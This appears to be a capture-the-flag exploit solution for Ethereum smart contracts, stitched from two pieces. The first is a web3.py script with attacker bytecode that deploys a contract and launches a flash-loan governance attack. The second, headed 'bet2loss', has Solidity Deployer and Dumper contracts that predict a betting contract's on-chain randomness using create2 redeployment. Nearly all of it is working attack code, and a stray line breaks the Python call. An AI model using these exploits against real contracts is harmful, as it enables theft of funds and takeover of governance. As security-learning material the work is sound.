        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "fee",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "data",
        "type": "bytes"
      }
    ],
    "name": "onFlashLoan",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "_prosId",
        "type": "uint256"
      }
    ],
    "name": "set_proposalId",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]
bytecode = 
0x6080604052600080546001600160a01b031990811673b3bd9369f0800f44af65a7cb6cdcd260d43a1fc71
7909155600180549091167390281424b4ac14ff93260a5b24e7ca5ddc67e1ab179055348015610058576000
80fd5b50610ae3806100686000396000f3fe608060405234801561001057600080fd5b50600436106100625
760003560e01c806323e30c8b146100675780633679735c1461008c578063418bc98b146100965780637356
d589146100a9578063f5308afe146100b1578063fd269537146100b9575b600080fd5b61007a61007536600
46107b6565b6100c1565b60405190815260200160405180910390f35b610094610353565b005b6100946100
a4366004610885565b600255565b6100946103b3565b6100946104ab565b610094610589565b60006100cb6
10353565b60018054600254604051630acf027160e31b815260048101919091526024810192909252600160
0160a01b031690635678138890604401602060405180830381600087803b15801561011c57600080fd5b505
af1158015610130573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101
90610154919061089e565b50604080516001808252818301909252600091602080830190803683370190505
09050308160008151811061018b5761018b610a97565b6001600160a01b0392909216602092830291909101
909101526040805160018082528183019092526000918160200160208202803683370190505090506a52b7d
2dcc80cd2e4000000816000815181106101e7576101e7610a97565b60209081029190910101526040805160
01808252818301909252600091816020015b606081526020019060019003908161020957905050604080516
0048152602481019091526020810180516001600160e01b0316637356d58960e01b17905281519192509082
9060009061025e5761025e610a97565b6020908102919091018101919091526040805191820181526000909
1526001549051630b0e90c560e21b81527fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfa
d8045d85a470916001600160a01b031690632c3a4314906102d09087908790879087906004016109c8565b6
02060405180830381600087803b1580156102ea57600080fd5b505af11580156102fe573d6000803e3d6000
fd5b505050506040513d601f19601f82011682018060405250810190610322919061089e565b507f439148f
0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd99b9a5050505050505050505050565b
6000546040516317066a5760e21b81523060048201526001600160a01b0390911690635c19a95c906024015
b600060405180830381600087803b15801561039957600080fd5b505af11580156103ad573d6000803e3d60
00fd5b50505050565b6040513360248201526a52b7d2dcc80cd2e4000000604482015260009073b3bd9369f
0800f44af65a7cb6cdcd260d43a1fc79060640160408051601f198184030181529181526020820180516001
600160e01b031663a9059cbb60e01b1790525161041e91906109ac565b6000604051808303816000865af19
150503d806000811461045b576040519150601f19603f3d011682016040523d82523d6000602084013e6104
60565b606091505b50509050806104a85760405162461bcd60e51b815260206004820152601060248201526
f185d1d1858dac818d85b1b0819985a5b60821b604482015260640160405180910390fd5b50565b60005460
405163095ea7b360e01b81526001600160a01b039091166004820181905260001960248301529063095ea7b
390604401602060405180830381600087803b1580156104f957600080fd5b505af115801561050d573d6000
803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610531919061085c565b5
060008054604051632e7ff4ef60e11b81523060048201526001600160a01b03909116602482018190526af8
277896582678ac0000006044830152608060648301526084820192909252635cffe9de9060a40161037f565
b60408051600180825281830190925260009160208083019080368337019050509050308160008151811061
05bf576105bf610a97565b6001600160a01b039290921660209283029190910190910152604080516001808
2528183019092526000918160200160208202803683370190505090506a52b7d2dcc80cd2e4000000816000
8151811061061b5761061b610a97565b6020908102919091010152604080516001808252818301909252600
091816020015b606081526020019060019003908161063d5790505060408051600481526024810190915260
20810180516001600160e01b0316637356d58960e01b1790528151919250908290600090610692576106926
10a97565b602090810291909101810191909152604080519182018152600082526001549051633eaf40f160
e11b81526001600160a01b0390911690637d5e81e2906106e3908790879087908790600401610a13565b602
060405180830381600087803b1580156106fd57600080fd5b505af1158015610711573d6000803e3d6000fd
5b505050506040513d601f19601f82011682018060405250810190610735919061089e565b507f4828f5bb2
dfa35a5884e15d8a8acbe9637abfc685699bc0b33864f79de95e78960405161078c90602080825260149082
01527363616c6c5f70726f706f7365207375636365737360601b604082015260600190565b6040518091039
0a150505050565b80356001600160a01b03811681146107b157600080fd5b919050565b6000806000806000
8060a087890312156107cf57600080fd5b6107d88761079a565b95506107e66020880161079a565b9450604
0870135935060608701359250608087013567ffffffffffffffff8082111561081157600080fd5b81890191
5089601f83011261082557600080fd5b81358181111561083457600080fd5b8a60208285010111156108465
7600080fd5b6020830194508093505050509295509295509295565b60006020828403121561086e57600080
fd5b8151801515811461087e57600080fd5b9392505050565b60006020828403121561089757600080fd5b5
035919050565b6000602082840312156108b057600080fd5b5051919050565b600081518084526020808501
945080840160005b838110156108f05781516001600160a01b0316875295820195908201906001016108cb5
65b509495945050505050565b600081518084526020808501808196508360051b8101915082860160005b85
811015610943578284038952610931848351610980565b98850198935090840190600101610919565b50919
79650505050505050565b600081518084526020808501945080840160005b838110156108f0578151875295
82019590820190600101610964565b60008151808452610998816020860160208601610a6b565b601f01601
f19169290920160200192915050565b600082516109be818460208701610a6b565b9190910192915050565b
6080815260006109db60808301876108b7565b82810360208401526109ed8187610950565b9050828103604
0840152610a0181866108fb565b91505082606083015295945050505050565b608081526000610a26608083
01876108b7565b8281036020840152610a388187610950565b90508281036040840152610a4c81866108fb5
65b90508281036060840152610a608185610980565b979650505050505050565b60005b83811015610a8657
8181015183820152602001610a6e565b838111156103ad5750506000910152565b634e487b7160e01b60005
2603260045260246000fdfea264697066735822122011fa67178054eac2d4502ce2b58d99efca295857f50f
a767343127828151efad64736f6c63430008070033
# # deploy
# newContract = w3.eth.contract(bytecode=bytecode, abi=abi)
# tx = newContract.constructor().buildTransaction()
# print(tx["data"])
def transact(tx):
    tx["chainId"] = w3.eth.chain_id
    signed_tx = my_account.sign_transaction(tx).rawTransaction
    txid = w3.eth.send_raw_transaction(signed_tx)
    print(txid.hex())
# transact(
#     {
#         "value": 0,
#         "nonce": w3.eth.get_transaction_count(my_account.address),
#         "gas": 3000000,
#         "from": my_account.address,
#         "gasPrice": 1,
#         "data": tx["data"],
#     },
# )
# call_propose 
contract_addr = "0x5723A03536f066E5096d9CCfcFBC9EBbeD32DC19"
contract = w3.eth.contract(address=contract_addr,abi=abi)
# tx = contract.functions.call_propose().buildTransaction()
# print(tx["data"])
# transact(
#     {
#         "value": 0,
#         "nonce": w3.eth.get_transaction_count(my_account.address),
#         "gas": 3000000,
#         "from": my_account.address,
#         "to": contract_addr,
#         "gasPrice": 1,
#         "data": tx["data"],
#     },
# )
# # set pid
# pid = 0x6a73b8518d8c9f6b176c0d249c5da328f99354e9a05d6526012bd041be23cbce
# tx = contract.functions.set_proposalId(pid).buildTransaction()
# print(tx["data"])
# transact(
#     {
#         "value": 0,
#         "nonce": w3.eth.get_transaction_count(my_account.address),
#         "gas": 3000000,
#         "from": my_account.address,
#         "to": contract_addr,
#         "gasPrice": 1,
#         "data": tx["data"],
#     },
# )
# launch attack
tx = contract.functions.call_flashLoan().buildTransaction()
print(tx["data"])
transact(
    {
        "value": 0,
        "nonce": w3.eth.get_transaction_count(my_account.address),
        "gas": 3000000,
bet2loss
        "from": my_account.address,
        "to": contract_addr,
        "gasPrice": 1,
        "data": tx["data"],
    },
)
pragma solidity ^0.8.0;
contract Deployer {
    bytes public deployBytecode;
    address public deployedAddr;
    uint256 public nonce;
    uint256 public round;
    event deploy_addr(address);
    function deploy(bytes memory code,uint256 _nonce,uint256 _round) public {
        deployBytecode = code;
        nonce = _nonce;
        round = _round;
        address a;
        // Compile Dumper to get this bytecode
        bytes memory dumperBytecode = 
hex'60806040523480156200001157600080fd5b50600033905060008173fffffffffffffffffffffffffff
fffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b15
80156200006057600080fd5b505afa15801562000075573d6000803e3d6000fd5b505050506040513d60008
23e3d601f19601f82011682018060405250810190620000a091906200055f565b905060008273ffffffffff
ffffffffffffffffffffffffffffff1663affed0e06040518163ffffffff1660e01b8152600401602060405
18083038186803b158015620000eb57600080fd5b505afa15801562000100573d6000803e3d6000fd5b5050
50506040513d601f19601f82011682018060405250810190620001269190620005b0565b905060008373fff
fffffffffffffffffffffffffffffffffffff1663146ca5316040518163ffffffff1660e01b815260040160
206040518083038186803b1580156200017157600080fd5b505afa15801562000186573d6000803e3d6000f
d5b505050506040513d601f19601f82011682018060405250810190620001ac9190620005b0565b90506200
01c08282620001c860201b60201c565b825160208401f35b60007321ac0df70a628cdb042dde6f4eb6cf49b
de00ff7905060008173ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffff
ffff1660e01b81526004016200021e9190620006a1565b602060405180830381600087803b1580156200023
957600080fd5b505af11580156200024e573d6000803e3d6000fd5b505050506040513d601f19601f820116
82018060405250810190620002749190620005b0565b905060007feb8f8e6e6aec6c492f2d95e709ac2e3d0
583d00beb28f62e0b1b014d4a7398f282604051620002a99190620006be565b60405180910390a160008414
156200031e578273ffffffffffffffffffffffffffffffffffffffff16633884d6356040518163ffffffff1
660e01b8152600401600060405180830381600087803b1580156200030457600080fd5b505af11580156200
0319573d6000803e3d6000fd5b505050505b6200032f856200047660201b60201c565b90508273fffffffff
fffffffffffffffffffffffffffffff16636ffcc71982600c6040518363ffffffff1660e01b815260040162
00036f929190620006db565b600060405180830381600087803b1580156200038a57600080fd5b505af1158
0156200039f573d6000803e3d6000fd5b505050508273ffffffffffffffffffffffffffffffffffffffff16
6327e235e3306040518263ffffffff1660e01b8152600401620003de9190620006a1565b602060405180830
381600087803b158015620003f957600080fd5b505af11580156200040e573d6000803e3d6000fd5b505050
506040513d601f19601f82011682018060405250810190620004349190620005b0565b91507feb8f8e6e6ae
c6c492f2d95e709ac2e3d0583d00beb28f62e0b1b014d4a7398f282604051620004679190620006be565b60
405180910390a15050505050565b600080600c9050600081844244306040516020016200049994939291906
200064b565b6040516020818303038152906040528051906020012060001c620004be919062000857565b90
508092505050919050565b6000620004e1620004db8462000731565b62000708565b9050828152602081018
484840111156200050057620004ff620008f2565b5b6200050d848285620007b9565b509392505050565b60
0082601f8301126200052d576200052c620008ed565b5b81516200053f848260208601620004ca565b91505
092915050565b60008151905062000559816200091f565b92915050565b6000602082840312156200057857
62000577620008fc565b5b600082015167ffffffffffffffff811115620005995762000598620008f7565b5
b620005a78482850162000515565b91505092915050565b600060208284031215620005c957620005c86200
08fc565b5b6000620005d98482850162000548565b91505092915050565b620005ed8162000767565b82525
050565b62000608620006028262000767565b62000825565b82525050565b6200061981620007a5565b8252
5050565b6200062a816200079b565b82525050565b620006456200063f826200079b565b6200084d565b825
25050565b600062000659828762000630565b6020820191506200066b828662000630565b60208201915062
00067d828562000630565b6020820191506200068f8284620005f3565b60148201915081905095945050505
050565b6000602082019050620006b86000830184620005e2565b92915050565b6000602082019050620006
d560008301846200061f565b92915050565b6000604082019050620006f260008301856200061f565b62000
70160208301846200060e565b9392505050565b60006200071462000727565b9050620007228282620007ef
565b919050565b6000604051905090565b600067ffffffffffffffff8211156200074f576200074e620008b
e565b5b6200075a8262000901565b9050602081019050919050565b600062000774826200077b565b905091
9050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600081905091905
0565b6000620007b2826200079b565b9050919050565b60005b83811015620007d957808201518184015260
2081019050620007bc565b83811115620007e9576000848401525b50505050565b620007fa8262000901565
b810181811067ffffffffffffffff821117156200081c576200081b620008be565b5b80604052505050565b
6000620008328262000839565b9050919050565b6000620008468262000912565b9050919050565b6000819
050919050565b600062000864826200079b565b915062000871836200079b565b9250826200088457620008
836200088f565b5b828206905092915050565b7f4e487b71000000000000000000000000000000000000000
00000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000
000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b60008
0fd5b6000601f19601f8301169050919050565b60008160601b9050919050565b6200092a816200079b565b
81146200093657600080fd5b5056fe';
        assembly {
            a := create2(callvalue(), add(0x20, dumperBytecode), mload(dumperBytecode), 
0x9453)
        }
        deployedAddr = a;
        emit deploy_addr(deployedAddr);
        (bool success,) = deployedAddr.call(abi.encodeWithSignature("destroy()"));
        require(success,"call fail");
    }
}
interface BetToken{
    function airdrop() external;
    function bet(uint256,uint256) external;
    function balances(address) external returns(uint256);
}
contract Dumper {
    function get_rand(uint256 nonce) public view returns(uint256){
        uint256 mod = 12;
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    nonce,
                    block.timestamp,
                    block.difficulty,
                    address(this)
                )
            )
        ) % mod;
        return rand;
    }
    event log_balance(uint256);
    function attack(uint256 nonce,uint256 round) public {
        BetToken target = BetToken(0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7);
        uint256 balance=target.balances(address(this));
        uint256 random;
        emit log_balance(balance);  
        if(round == 0){
            target.airdrop();
        }
        random = get_rand(nonce);
        target.bet(random,12);
        balance = target.balances(address(this));
        emit log_balance(balance);
    }
    constructor() public {
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        uint256 nonce = dp.nonce();
        uint256 round = dp.round();
        attack(nonce,round);
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }